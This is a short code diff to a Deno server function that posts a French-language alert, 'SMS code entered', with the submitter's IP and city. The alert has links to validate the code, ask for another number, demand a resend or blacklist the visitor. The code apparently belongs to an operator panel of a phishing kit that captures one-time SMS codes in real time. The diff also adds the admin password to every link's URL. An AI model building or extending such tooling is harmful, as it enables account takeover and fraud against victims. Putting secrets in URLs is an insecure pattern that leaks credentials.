@@ -51,6 +51,7 @@ Deno.serve(async (req) => {
   const city = geoData.city || "Inconnue";
 
   const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
+  const expectedSecret = Deno.env.get("ADMIN_PASSWORD") || "";
 
   const embed = {
     title: "🔑 Code SMS entré",
@@ -68,7 +69,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [Valider le code](${appUrl}/?action=valid&id=${submissionId})\n❌ [Changer le numéro](${appUrl}/?action=wrong&id=${submissionId})\n⏰ [Renvoyer au code](${appUrl}/?action=expired&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${ip})`,
+        value: `✅ [Valider le code](${appUrl}/?action=valid&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n❌ [Changer le numéro](${appUrl}/?action=wrong&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n⏰ [Renvoyer au code](${appUrl}/?action=expired&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${ip}&s=${encodeURIComponent(expectedSecret)})`,
         inline: false,
       },
     ],
